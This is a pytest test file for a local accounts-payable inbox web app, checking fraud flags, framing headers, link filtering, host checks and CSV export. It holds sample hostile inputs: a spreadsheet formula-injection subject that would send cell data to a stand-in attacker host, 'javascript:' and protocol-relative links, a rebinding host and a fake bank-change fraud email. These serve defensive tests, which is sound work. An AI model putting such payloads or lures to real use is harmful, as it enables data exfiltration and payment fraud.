from __future__ import annotations

import copy
import csv
import io
import json
import os
import re
import shutil
import subprocess
import threading
import time
from datetime import datetime, timezone
from email.message import EmailMessage
from email.utils import format_datetime
from pathlib import Path
from types import SimpleNamespace

import httpx
import pytest
from fastapi.testclient import TestClient
from openpyxl import Workbook

from controller_inbox import assistant, cli, services, web
from controller_inbox.cli import load_sample
from controller_inbox.config import Settings
from controller_inbox.demo import make_pdf
from controller_inbox.digest import build_digest
from controller_inbox.folder_mail import ingest_folder
from controller_inbox.overnight import run_lock
from controller_inbox.pipeline import ingest_demo
from controller_inbox.store import Store
from controller_inbox.web import allowed_hosts, create_app
from helpers import PAGE
from liveserver import serving
from msgfactory import PDF, XLSX


def test_dashboard_after_demo(store, settings, as_of_now):
    ingest_demo(store, settings, now=as_of_now)
    build_digest(store, as_of=as_of_now.date(), generated_at=as_of_now)
    app = create_app(settings, store)
    client = TestClient(app)

    home = client.get("/")
    assert home.status_code == 200
    assert "CloseDesk" in home.text
    assert "Controller inbox" not in home.text
    assert "Assistant controller" not in home.text
    assert "INV-10482" in home.text
    assert "Updated wiring instructions" in home.text
    assert "Fraud flags" in home.text

    detail = client.get("/inbox/demo-bec-wire")
    assert detail.status_code == 200
    assert "verify" in detail.text.lower()
    assert "Wrong category?" in detail.text
    assert "do not process" in detail.text.lower() or "fraud" in detail.text.lower()

    corrected = client.post(
        "/inbox/demo-newsletter/correct",
        data={"category": "internal_fyi", "reason": "This weekly note is internal, not a vendor newsletter."},
        follow_redirects=True,
    )
    assert corrected.status_code == 200
    assert "correction you saved" in corrected.text.lower() or "user trained" in corrected.text.lower() or "Internal FYI" in corrected.text

    actions = client.get("/actions")
    assert actions.status_code == 200
    assert "Reconcile bank statement" in actions.text or "invoice" in actions.text.lower()

    attachments = client.get("/attachments")
    assert attachments.status_code == 200
    assert "INV-10482.pdf" in attachments.text

    digest = client.get("/digest")
    assert digest.status_code == 200
    assert "Do not process" in digest.text

    important = client.get("/folder/important")
    assert important.status_code == 200
    assert "INV-10482" in important.text
    assert "Script draft" in important.text

    informational = client.get("/folder/informational")
    assert informational.status_code == 200
    assert "accounting" in informational.text.lower() or "newsletter" in informational.text.lower()

    reference = client.get("/folder/reference")
    assert reference.status_code == 200
    assert "statement" in reference.text.lower() or "PO-77821" in reference.text

    missing = client.get("/folder/archive")
    assert missing.status_code == 404

    csv_resp = client.get("/export/actions.csv")
    assert csv_resp.status_code == 200
    assert "priority" in csv_resp.text
    assert "demo-bec-wire" in csv_resp.text

    actions_page = client.get("/actions")
    assert "Verify payment-instruction change" in actions_page.text
    bec = store.get_email("demo-bec-wire")
    assert bec is not None
    action_id = bec.actions[0].id
    done = client.post(f"/actions/{action_id}/complete?next=/actions", follow_redirects=True)
    assert done.status_code == 200
    remaining = {item.id for item, _ in store.list_actions(status="open")}
    assert action_id not in remaining

    health = client.get("/health")
    assert health.json()["ok"] is True
    assert health.json()["emails"] == 19


def test_empty_state_and_reload(store, settings):
    app = create_app(settings, store)
    client = TestClient(app)
    empty = client.get("/")
    assert empty.status_code == 200
    assert "Load sample mailbox" in empty.text
    reloaded = client.post("/demo/reload", follow_redirects=True)
    assert reloaded.status_code == 200
    assert "INV-10482" in reloaded.text


def test_folder_done_and_preview_correction(store, settings, as_of_now):
    ingest_demo(store, settings, now=as_of_now)
    client = TestClient(create_app(settings, store))
    email = store.list_emails(folder="important", limit=1)[0]
    before = store.counts()["important"]

    page = client.get("/folder/important")
    assert f"/inbox/{email.id}/done?next=" in page.text

    done = client.post(f"/inbox/{email.id}/done", params={"next": "/folder/important"}, follow_redirects=False)
    assert done.status_code == 303 and done.headers["location"] == "/folder/important"
    assert store.is_done(email.id)
    assert f'data-email="{email.id}"' not in client.get("/folder/important").text
    assert "Show 1 done" in client.get("/folder/important").text
    assert store.counts()["important"] == before - 1

    shown = client.get("/folder/important?done=1").text
    assert f'data-email="{email.id}"' in shown and "Undo" in shown
    assert "Undo done" in client.get(f"/inbox/{email.id}/preview").text

    client.post(f"/inbox/{email.id}/done", params={"undo": 1, "next": "/folder/important?done=1"})
    assert not store.is_done(email.id)
    assert f'data-email="{email.id}"' in client.get("/folder/important").text
    assert client.post("/inbox/nope/done").status_code == 404

    preview = client.get("/inbox/demo-newsletter/preview", params={"next": "/folder/informational"}).text
    assert "Wrong category?" in preview and 'name="next" value="/folder/informational"' in preview
    fixed = client.post(
        "/inbox/demo-newsletter/correct",
        data={"category": "internal_fyi", "reason": "Internal weekly note.", "next": "/folder/informational"},
        follow_redirects=False,
    )
    assert fixed.headers["location"] == "/folder/informational?notice=corrected"
    assert "Category corrected" in client.get(fixed.headers["location"]).text


NOW = datetime(2026, 9, 22, 13, 0, tzinfo=timezone.utc)


def _age(path: Path) -> None:
    """Files written just now look like they are still being copied; date them a minute back."""
    old = time.time() - 60
    os.utime(path, (old, old))


# A close pack with a workbook is not an AP invoice --------------------------------------------------
def _invoice_eml(settings) -> Path:
    message = EmailMessage()
    message["From"] = "Acme AR <ar@acme-industrial.example>"
    message["To"] = "ap@horizongoods.example"
    message["Subject"] = "Invoice INV-88123 from Acme Industrial Supply"
    message["Date"] = format_datetime(NOW)
    message["Message-ID"] = "<acme-inv-1@acme-industrial.example>"
    message.set_content("Hello,\n\nPlease find attached invoice INV-88123 for PO-4410. Total due $4,319.50 by 11/11/2026.\n\nThanks,\nAcme AR")
    path = settings.inbox_incoming / "acme-inv-1.eml"
    path.write_bytes(bytes(message))
    _age(path)
    return path


# Open in Outlook without a mail app says so plainly -------------------------------------------------
def test_open_in_outlook_without_a_mail_app_says_so_in_plain_words(store, settings, monkeypatch):
    settings.ensure_data_dir()
    _invoice_eml(settings)
    [record] = ingest_folder(store, settings, now=NOW)

    def no_opener(_path):
        raise FileNotFoundError(2, "No such file or directory", "xdg-open")

    monkeypatch.setattr(web, "open_file", no_opener)
    client = TestClient(web.create_app(settings, store))
    reply = client.post(f"/inbox/{record.id}/open", headers=PAGE).json()
    assert reply["ok"] is False and reply["download"].endswith("/original")
    assert "Errno" not in reply["message"] and "xdg-open" not in reply["message"]
    assert "download" in reply["message"].lower()
    opened = client.post("/coding/open", headers=PAGE).json()
    assert opened["ok"] is False and "Errno" not in opened["message"] and "xdg-open" not in opened["message"]


# The classic pages: an icon, and no sideways scrolling on a phone ----------------------------------
def test_the_classic_pages_have_an_icon(store, settings, as_of_now):
    ingest_demo(store, settings, now=as_of_now)
    client = TestClient(web.create_app(settings, store))
    icon = client.get("/favicon.ico")
    assert icon.status_code == 200 and icon.headers["content-type"].startswith("image/")
    for path in ("/", "/inbox", "/settings", "/coding"):
        assert 'rel="icon"' in client.get(path).text, path


UI = Path(__file__).resolve().parent.parent / "src" / "controller_inbox" / "static" / "ui"


SENT = datetime(2026, 10, 19, 13, 0, tzinfo=timezone.utc)


class _Canvas:
    """Text placed on a letter-size page, written as a PDF (the few reportlab canvas calls these tests use)."""

    def __init__(self, out: io.BytesIO):
        self.out, self.font, self.ops = out, ("F1", 12), []

    def setFont(self, name: str, size: float) -> None:
        self.font = ("F2" if name.endswith("Bold") else "F1", size)

    def drawString(self, x: float, y: float, text: str) -> None:
        escaped = text.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
        self.ops.append(f"BT /{self.font[0]} {self.font[1]} Tf {x} {y} Td ({escaped}) Tj ET")

    def showPage(self) -> None:
        pass

    def save(self) -> None:
        stream = "\n".join(self.ops).encode("latin-1")
        objects = [
            b"<< /Type /Catalog /Pages 2 0 R >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
            b"/Resources << /Font << /F1 5 0 R /F2 6 0 R >> >> >>",
            b"<< /Length %d >>\nstream\n" % len(stream) + stream + b"\nendstream",
            b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>",
            b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold /Encoding /WinAnsiEncoding >>",
        ]
        pdf = bytearray(b"%PDF-1.4\n")
        offsets = []
        for number, body in enumerate(objects, 1):
            offsets.append(len(pdf))
            pdf += b"%d 0 obj\n" % number + body + b"\nendobj\n"
        xref = len(pdf)
        pdf += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1)
        pdf += b"".join(b"%010d 00000 n \n" % offset for offset in offsets)
        pdf += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objects) + 1, xref)
        self.out.write(bytes(pdf))


def _bolt_invoice(number: str, amount: str) -> bytes:
    """A letterhead, a block of details on the right, a parts table and "Amount Due" with no currency mark."""
    out = io.BytesIO()
    c = _Canvas(out)
    c.setFont("Helvetica-Bold", 20)
    c.drawString(72, 720, "Bolt Fasteners Inc")
    c.setFont("Helvetica", 10)
    c.drawString(72, 704, "77 Rivet Lane, Akron OH 44301")
    c.setFont("Helvetica-Bold", 16)
    c.drawString(420, 720, "INVOICE")
    c.setFont("Helvetica", 11)
    for i, (key, value) in enumerate([("Invoice #", number), ("Date", "10/14/2026"), ("Due", "11/13/2026"), ("PO", "PO-9001"), ("Job Site", "Riverside Plant")]):
        c.drawString(380, 690 - 16 * i, key)
        c.drawString(460, 690 - 16 * i, value)
    y = 580
    c.setFont("Helvetica-Bold", 11)
    for x, text in [(72, "Part"), (200, "Description"), (400, "Qty"), (450, "Price"), (510, "Ext")]:
        c.drawString(x, y, text)
    c.setFont("Helvetica", 11)
    for row in [("B-1", "Lag bolts", "100", "2.00", "200.00"), ("B-2", "Washers", "500", "0.10", "50.00")]:
        y -= 18
        for x, text in zip([72, 200, 400, 450, 510], row):
            c.drawString(x, y, text)
    y -= 30
    c.setFont("Helvetica-Bold", 12)
    c.drawString(400, y, "Amount Due")
    c.drawString(510, y, amount)
    c.showPage()
    c.save()
    return out.getvalue()


def _subledger() -> bytes:
    book = Workbook()
    sheet = book.active
    sheet.title = "AP subledger"
    sheet.append(["Vendor", "Invoice", "Amount"])
    for row in [("Bolt Fasteners", "BF-5001", 250), ("Acme", "INV-88123", 4319.5), ("Northwind", "INV-10482", 12850)]:
        sheet.append(list(row))
    out = io.BytesIO()
    book.save(out)
    return out.getvalue()


def _eml(folder: Path, name: str, *, subject: str, body: str, sender: str, address: str, files, when=SENT) -> None:
    message = EmailMessage()
    message["From"] = f"{sender} <{address}>"
    message["To"] = "ap@horizongoods.example"
    message["Subject"] = subject
    message["Date"] = format_datetime(when)
    message["Message-ID"] = f"<{name}@{address.split('@')[1]}>"
    message.set_content(body)
    for filename, data, mime in files:
        main, sub = mime.split("/")
        message.add_attachment(data, maintype=main, subtype=sub, filename=filename)
    folder.mkdir(parents=True, exist_ok=True)
    (folder / f"{name}.eml").write_bytes(bytes(message))


def _ingest(store, settings) -> dict:
    return {email.subject: store.get_email(email.id) for email in ingest_folder(store, settings)}


def _fraud_with_files(settings) -> None:
    _eml(
        settings.inbox_incoming,
        "fraud-att",
        subject="URGENT change of bank details - Bolt Fasteners",
        body="Our bank details have changed. Please update your records and send all future payments to the new account: "
        "routing 021000021 account 99887766. Please pay invoice BF-5001 $250.00 today to the new account. Keep this confidential.",
        sender="Bolt Fasteners Accounts",
        address="accounts@b0ltfasteners.example",
        files=[("new-bank-letter.pdf", _bolt_invoice("BF-5001", "250.00"), PDF), ("bank.xlsx", _subledger(), XLSX)],
    )


@pytest.fixture
def client(store, settings, mail):
    return TestClient(web.create_app(settings, store))


# Every page refuses to be framed by another site; the PDF preview may still be framed by CloseDesk itself.
def test_every_page_refuses_to_be_framed_by_another_site(client, mail):
    """The workspace, the classic pages and the API answer with X-Frame-Options DENY and frame-ancestors 'none'."""
    budget = mail["Q4 budget draft"]
    for path in ("/app", "/", "/inbox", f"/inbox/{budget.id}", "/settings", "/static/ui/main.js"):
        response = client.get(path)
        assert response.headers.get("x-frame-options") == "DENY", path
        assert "frame-ancestors 'none'" in response.headers.get("content-security-policy", ""), path
    api = client.get("/api/mail", headers=PAGE)
    assert api.headers.get("x-frame-options") == "DENY"


def test_the_original_pdf_is_still_framed_by_closedesk_itself(store, settings):
    """/files/{n}/view keeps its own same-origin framing rule, which the Preview tab's iframe needs."""
    settings.ensure_data_dir()
    _eml(settings.inbox_incoming, "bolt-1", subject="Invoice BF-5001 from Bolt Fasteners", body="Invoice attached.",
         sender="Bolt Fasteners AR", address="ar@boltfasteners.example", files=[("BF-5001.pdf", _bolt_invoice("BF-5001", "250.00"), PDF)])
    [email] = _ingest(store, settings).values()
    response = TestClient(web.create_app(settings, store)).get(f"/inbox/{email.id}/files/1/view")
    assert response.status_code == 200
    assert response.headers["x-frame-options"] == "SAMEORIGIN"
    assert response.headers["content-security-policy"] == "frame-ancestors 'self'"


# A link starting "/\" is a link to another site (browsers read it as "//"); the page drops it.
def test_safe_url_refuses_backslash_protocol_relative_links():
    """dom.js's SAFE_URL keeps same-site paths, anchors and mailto: and refuses "//x", "/\\x" and "\\\\x"."""
    node = shutil.which("node")
    if not node:
        pytest.skip("Node.js isn't installed")
    source = (UI / "dom.js").read_text(encoding="utf-8")
    pattern = re.search(r"const SAFE_URL = (/.*/[a-z]*);", source).group(1)
    tries = ["/app", "/inbox/x?y=1", "#top", "mailto:a@b.c", "//evil.example", "/\\evil.example", "/\t/evil.example", "\\\\evil", "javascript:alert(1)", "https://evil.example"]
    script = f"const re = {pattern};\nconsole.log(JSON.stringify({json.dumps(tries)}.map(u => re.test(u))));\n"
    result = json.loads(subprocess.run([node, "-e", script], capture_output=True, text=True, check=True).stdout)
    assert result == [True, True, True, True, False, False, False, False, False, False]


# An email held as possible payment fraud is not offered for AP coding.
def test_a_blocked_email_is_not_offered_for_ap_coding(store, settings):
    """A bank-change email carrying an invoice is held: it gets no cost-code suggestion and isn't on the coding list."""
    settings.ensure_data_dir()
    _fraud_with_files(settings)
    scam = _ingest(store, settings)["URGENT change of bank details - Bolt Fasteners"]
    assert "fraud_risk" in scam.flags
    client = TestClient(web.create_app(settings, store))
    assert store.cost_coding(scam.id) is None
    listed = client.get("/api/coding", params={"status": "all"}, headers=PAGE).json()
    assert scam.id not in [item["id"] for item in listed["items"]]
    assert listed["counts"]["all"] == 0


# The classic file page doesn't show a blocked email's file text, as the workspace doesn't.
def test_classic_file_page_refuses_a_blocked_emails_file(client, mail):
    """GET /inbox/<blocked>/files/1 is refused with 403 and shows none of the file's text until the email is cleared."""
    scam = mail["Updated remittance details"]
    refused = client.get(f"/inbox/{scam.id}/files/1")
    assert refused.status_code == 403
    assert "8899" not in refused.text and "Remit to account" not in refused.text
    client.post(f"/inbox/{scam.id}/fraud", data={"choice": "safe:email"})
    opened = client.get(f"/inbox/{scam.id}/files/1")
    assert opened.status_code == 200 and "Remit to account" in opened.text


# Keys and buttons on the classic pages.
def test_enter_in_a_note_or_filter_box_presses_no_button(loaded: Store, settings: Settings):
    import re

    from fastapi.testclient import TestClient

    from controller_inbox.web import create_app

    client = TestClient(create_app(settings, loaded))
    page = client.get("/inbox/demo-bec-wire").text
    form = page[page.index('class="verdict-form"'):]
    first = re.search(r"<button[^>]*>", form).group(0)
    assert "disabled" in first and "hidden" in first, "Enter in the note box mustn't press Not fraud"


def test_stop_when_nothing_runs_says_nothing_about_stopping(loaded: Store, settings: Settings):
    from fastapi.testclient import TestClient

    from controller_inbox.web import create_app

    client = TestClient(create_app(settings, loaded), follow_redirects=False)
    reply = client.post("/process/stop", headers={"Origin": "http://testserver"})
    assert reply.headers["location"] == "/"
    assert client.post("/api/process/stop", headers={"Origin": "http://testserver", "X-CloseDesk": "1"}).json()["stopping"] is False


# --- A file dropped loose in the inbox downloaded as the "original" although its type is blocked ------------------
def test_original_of_a_dropped_macro_file_does_not_download(settings, store):
    # The workbook becomes its own email. Its attachment download was refused, but /original served the same file.
    settings.ensure_data_dir()
    (settings.inbox_incoming / "payment run.xlsm").write_bytes(b"PK\x03\x04 macro workbook")
    (email,) = ingest_folder(store, settings)
    client = TestClient(web.create_app(settings, store))

    assert client.get(f"/inbox/{email.id}/files/1/download").status_code == 403
    response = client.get(f"/inbox/{email.id}/original")
    assert response.status_code == 403
    assert "doesn't download" in response.text and "Outlook" not in response.text


def test_opening_a_dropped_macro_file_points_to_the_folder_it_is_in(settings, store):
    # "Only opens from Outlook" was wrong: the file was dropped in the inbox folder, not mailed.
    settings.ensure_data_dir()
    (settings.inbox_incoming / "payment run.xlsm").write_bytes(b"PK\x03\x04 macro workbook")
    (email,) = ingest_folder(store, settings)
    reply = TestClient(web.create_app(settings, store)).post(f"/inbox/{email.id}/open", headers={"X-CloseDesk": "1"}).json()
    assert reply["ok"] is False and "download" not in reply
    assert "Outlook" not in reply["message"] and str(settings.inbox_processed) in reply["message"], reply


def test_a_dropped_macro_files_pages_offer_no_download_of_it(settings, store):
    # Its original doesn't download, so the email page, the preview and the workspace don't offer to.
    settings.ensure_data_dir()
    (settings.inbox_incoming / "payment run.xlsm").write_bytes(b"PK\x03\x04 macro workbook")
    (settings.inbox_incoming / "statement.pdf").write_bytes(b"%PDF-1.4 statement")
    emails = {e.subject: e for e in ingest_folder(store, settings)}
    client = TestClient(web.create_app(settings, store))
    macro, pdf = (next(e for name, e in emails.items() if word in name) for word in ("payment", "statement"))
    for path in (f"/inbox/{macro.id}", f"/inbox/{macro.id}/preview"):
        assert f"/inbox/{macro.id}/original" not in client.get(path).text
    assert f"/inbox/{pdf.id}/original" in client.get(f"/inbox/{pdf.id}").text
    api = {"X-CloseDesk": "1"}
    assert client.get(f"/api/mail/{macro.id}", headers=api).json()["original_downloads"] is False
    assert client.get(f"/api/mail/{pdf.id}", headers=api).json()["original_downloads"] is True


def test_original_of_a_dropped_pdf_still_downloads(settings, store):
    settings.ensure_data_dir()
    (settings.inbox_incoming / "statement.pdf").write_bytes(b"%PDF-1.4 statement")
    (email,) = ingest_folder(store, settings)
    response = TestClient(web.create_app(settings, store)).get(f"/inbox/{email.id}/original")
    assert response.status_code == 200
    assert response.headers["x-content-type-options"] == "nosniff"


# --- A sender address with a non-ASCII domain crashed the rebuilt .eml (500) --------------------------------------
def test_rebuilt_eml_with_an_international_sender_address():
    email = SimpleNamespace(
        subject="Rechnung 4711", sender_name="Jörg Müller", sender_email="joerg@müller.de",
        received_at="2026-10-01T09:00:00Z", body_text="Anbei die Rechnung.",
    )
    data = web._rebuilt_eml(email)
    assert b"Rechnung 4711" in data
    assert b"joerg@xn--mller-kva.de" in data
    # A non-ASCII local part can't go in an address formataddr writes; the address goes in on its own.
    data = web._rebuilt_eml(SimpleNamespace(**{**vars(email), "sender_email": "jörg@muller.de"}))
    assert b"Rechnung 4711" in data


ROOT = Path(__file__).resolve().parent.parent


SAME = {"origin": "http://testserver"}


# Reloading the sample keeps Setup choices, the trust list and conversations; refused while processing.
def test_sample_reload_keeps_setup_trust_and_chats(settings: Settings, store: Store):
    settings.ensure_data_dir()
    load_sample(store, settings)
    client = TestClient(create_app(settings, store), follow_redirects=False)
    assert client.post("/settings/timezone", data={"zone": "Asia/Tokyo"}, headers=SAME).status_code == 303
    assert client.post("/settings/context", data={"step": "0"}, headers=SAME).status_code == 303
    assert client.post("/settings/profile", data={"profile": "finance"}, headers=SAME).status_code == 303
    store.set_trust("domain", "taz.com", "safe", source="you")
    store.create_chat("c1")
    store.add_chat_turn("c1", "user", "What is due?")
    store.set_state("last_overnight_at", "2026-09-22T10:00:00+00:00")

    assert client.post("/demo/reload", headers=SAME).status_code == 303
    assert store.get_state("timezone") == "Asia/Tokyo"
    assert store.get_state("min_context_tokens") == "0"
    assert store.get_state("profile") == "finance"
    assert [row["value"] for row in store.trust_entries()] == ["taz.com"]
    assert [chat["id"] for chat in store.list_chats()] == ["c1"]
    assert store.get_state("last_overnight_at") is None, "mail bookkeeping starts over"
    assert store.counts()["emails"] == 19


def test_sample_reload_is_refused_while_mail_is_processing(settings: Settings, store: Store):
    settings.ensure_data_dir()
    app = create_app(settings, store)
    client = TestClient(app, follow_redirects=False)
    app.state.job.state = "running"
    assert client.post("/demo/reload", headers=SAME).headers["location"] == "/settings?notice=sample-busy"
    app.state.job.state = "idle"
    with run_lock(settings):  # another process's run holds the lock
        assert client.post("/demo/reload", headers=SAME).headers["location"] == "/settings?notice=sample-busy"
    assert store.counts()["emails"] == 0
    assert client.post("/demo/reload", headers=SAME).headers["location"] == "/"


# The flag filter is applied before the row limit.
def test_flag_filter_finds_old_mail_past_the_limit(loaded: Store):
    fraud = [e for e in loaded.list_emails(limit=500) if "fraud_risk" in e.flags]
    assert fraud
    base = loaded.list_emails(limit=1)[0]
    for i in range(210):
        email = copy.deepcopy(base)
        email.id, email.flags, email.attachments, email.actions = f"new-{i}", [], [], []
        email.received_at = f"2030-01-01T00:{i // 60:02d}:{i % 60:02d}+00:00"
        loaded.upsert_email(email)
    assert {e.id for e in loaded.list_emails(flag="fraud_risk")} == {e.id for e in fraud}
    assert loaded.list_emails(flag="fraud") == [], "a whole flag, not part of one"


# The README says where conversations are kept.
def test_readme_does_not_claim_chats_vanish_with_the_tab():
    text = (ROOT / "README.md").read_text(encoding="utf-8")
    assert "cleared when the tab closes" not in text
    assert "Past conversations" in text


# Binding beyond loopback never allows every hostname, and warns there is no login.
def test_lan_bind_refuses_rebinding_and_foreign_origins(settings: Settings, loaded: Store):
    settings.host = "0.0.0.0"
    assert "*" not in allowed_hosts("0.0.0.0", "*")
    app = create_app(settings, loaded)
    rebound = TestClient(app, base_url="http://attacker.example:8765")
    assert rebound.get("/chats").status_code == 400
    assert rebound.post("/settings/profile", data={"profile": "general"}, headers={"origin": "http://attacker.example:8765"}).status_code == 400
    local = TestClient(app, follow_redirects=False)
    assert local.post("/settings/profile", data={"profile": "general"}, headers={"origin": "http://attacker.example"}).status_code == 403
    assert local.post("/settings/profile", data={"profile": "general"}, headers=SAME).status_code == 303


def test_extra_allowed_hosts_and_startup_warning(settings: Settings, store: Store, monkeypatch, capsys):
    settings.allowed_hosts = "closedesk.corp"
    settings.host = "0.0.0.0"
    client = TestClient(create_app(settings, store), base_url="http://closedesk.corp:8765")
    assert client.get("/health").status_code == 200
    import uvicorn

    monkeypatch.setattr(uvicorn, "run", lambda *a, **k: None)
    cli._serve(settings, store, host="0.0.0.0", port=8765)
    out = capsys.readouterr().out
    assert "WARNING" in out and "no login" in out and "closedesk.corp" in out
    cli._serve(settings, store, host="127.0.0.1", port=8765)
    assert "WARNING" not in capsys.readouterr().out


def test_clear_sample_removes_every_trace_of_sample_mail(loaded: Store):
    email = loaded.get_email("demo-inv-10482")
    att = email.attachments[0]
    loaded.save_embeddings("m", [("k1", email.id, "t", b"\x00" * 8), ("chat-k", "chat-c1", "t", b"\x00" * 8)])
    loaded.save_file_summary(att.id, "key", "summary")
    loaded.log_fraud({"event": "flagged", "email_id": email.id})
    assert loaded.clear_sample() == 19
    with loaded.connect() as conn:
        assert conn.execute("SELECT email_id FROM embeddings").fetchall()[0][0] == "chat-c1"
        assert conn.execute("SELECT COUNT(*) FROM file_summaries").fetchone()[0] == 0
        assert conn.execute("SELECT COUNT(*) FROM fraud_log WHERE email_id = ?", (email.id,)).fetchone()[0] == 0


# A browser that goes away mid-answer: the answer so far is saved, and the model stops writing it.
def test_an_answer_the_browser_left_is_saved_and_the_model_stops(settings: Settings, loaded: Store, monkeypatch):
    stopped = threading.Event()
    written: list[int] = []

    def slow_model(*_args, **_kwargs):
        try:
            for i in range(300):
                written.append(i)
                yield f"part{i} "
                time.sleep(0.02)
        finally:
            stopped.set()

    monkeypatch.setattr(assistant, "llm_active", lambda _s: True)
    monkeypatch.setattr(assistant, "needs_more_context", lambda _s: False)
    monkeypatch.setattr(assistant, "stream_text", slow_model)
    with serving(create_app(settings, loaded)) as base, httpx.Client(trust_env=False, timeout=20) as client:
        with client.stream("POST", f"{base}/chat", headers=PAGE, json={"message": "What needs a reply?"}) as response:
            lines = response.iter_lines()
            chat_id = json.loads(next(lines))["id"]
            deltas = 0
            while deltas < 3:
                deltas += json.loads(next(lines))["type"] == "delta"
        # Leaving the block drops the connection, as closing the tab does.
        assert stopped.wait(10), "the model stops when the browser goes away"
        deadline = time.monotonic() + 10
        while len(loaded.chat_turns(chat_id)) < 2 and time.monotonic() < deadline:
            time.sleep(0.05)
    assert len(written) < 300
    asked, answer = loaded.chat_turns(chat_id)
    assert asked["text"] == "What needs a reply?" and answer["role"] == "assistant"
    assert answer["text"].startswith("part0 part1 part2 ")
    assert answer["text"].endswith("(Stopped: the page closed before the answer finished.)")
    assert answer["failed"], "an answer cut short isn't learned from"


# The actions export keeps a spreadsheet from running a subject or sender as a formula.
def test_actions_export_writes_formulas_as_text(settings: Settings, store: Store):
    settings.ensure_data_dir()
    subject = '=HYPERLINK("https://evil.example/?d="&A2,"Invoice 2002")'
    message = EmailMessage()
    message["Subject"] = subject
    message["From"] = "AP <+cmd@vendor.example>"
    message["Date"] = "Mon, 05 Oct 2026 14:30:00 +0000"
    message.set_content("Please find invoice INV-2002 attached. Amount due $1,250.00 by October 30, 2026.")
    pdf = make_pdf([["Invoice INV-2002 Amount due $1,250.00"]])
    message.add_attachment(pdf, maintype="application", subtype="pdf", filename="INV-2002.pdf")
    (settings.inbox_incoming / "invoice.eml").write_bytes(bytes(message))
    ingest_folder(store, settings)

    response = TestClient(create_app(settings, store)).get("/export/actions.csv")
    rows = list(csv.DictReader(io.StringIO(response.text)))
    assert rows and response.headers["content-type"].startswith("text/csv")
    assert {row["subject"] for row in rows} == {"'" + subject}
    assert {row["sender"] for row in rows} == {"'+cmd@vendor.example"}
    assert all(row["title"][:1] not in {"=", "+", "-", "@"} for row in rows)


# A chat answer gets ready in a worker thread, so other pages answer meanwhile.
def test_other_pages_answer_while_a_chat_answer_gets_ready(settings: Settings, loaded: Store, monkeypatch):
    started = threading.Event()
    release = threading.Event()
    real_digest = services.build_digest

    def slow_digest(*args, **kwargs):
        # The chat's setup is held until the other page has answered (or 10 s pass).
        started.set()
        release.wait(10)
        return real_digest(*args, **kwargs)

    monkeypatch.setattr(services, "build_digest", slow_digest)
    answered: dict = {}

    def ask(base: str) -> None:
        with httpx.Client(trust_env=False, timeout=30) as client:
            answered["chat"] = client.post(f"{base}/chat", headers=PAGE, json={"message": "What's urgent today?"})

    with serving(create_app(settings, loaded)) as base, httpx.Client(trust_env=False, timeout=30) as client:
        asking = threading.Thread(target=ask, args=(base,))
        asking.start()
        assert started.wait(10)
        began = time.monotonic()
        assert client.get(f"{base}/health").status_code == 200
        waited = time.monotonic() - began
        release.set()
        asking.join(30)
    assert waited < 2, "other pages don't wait for a chat's setup"
    assert answered["chat"].status_code == 200 and '"type": "done"' in answered["chat"].text


STAMP = "2026-09-22T16:00:00+00:00"


def _zoned_app(root: Path, zone: str):
    settings = Settings(data_dir=root, inbox_dir=root / "inbox", timezone=zone, llm_base_url="http://127.0.0.1:9/v1", _env_file=None)
    store = Store(settings.db_path)
    store.set_state("last_overnight_at", STAMP)
    return create_app(settings, store), store


def test_each_app_formats_times_in_its_own_zone_even_when_another_renders_mid_page(tmp_path):
    """An app's page shows times in its own zone though another app with another zone rendered in between."""
    app_ny, store_ny = _zoned_app(tmp_path / "ny", "America/New_York")
    app_la, _ = _zoned_app(tmp_path / "la", "America/Los_Angeles")
    client_ny, client_la = TestClient(app_ny), TestClient(app_la)
    assert "Sep 22 · 09:00" in client_la.get("/").text

    real_get_state = store_ny.get_state
    interleaved = []

    def get_state_with_other_render(key, *args, **kwargs):
        if key == "last_overnight_at" and not interleaved:
            interleaved.append(client_la.get("/").status_code)
        return real_get_state(key, *args, **kwargs)

    store_ny.get_state = get_state_with_other_render
    page = client_ny.get("/").text
    assert interleaved == [200]
    assert "Sep 22 · 12:00" in page
    assert "Sep 22 · 09:00" not in page
    assert 'data-tz="America/New_York"' in page
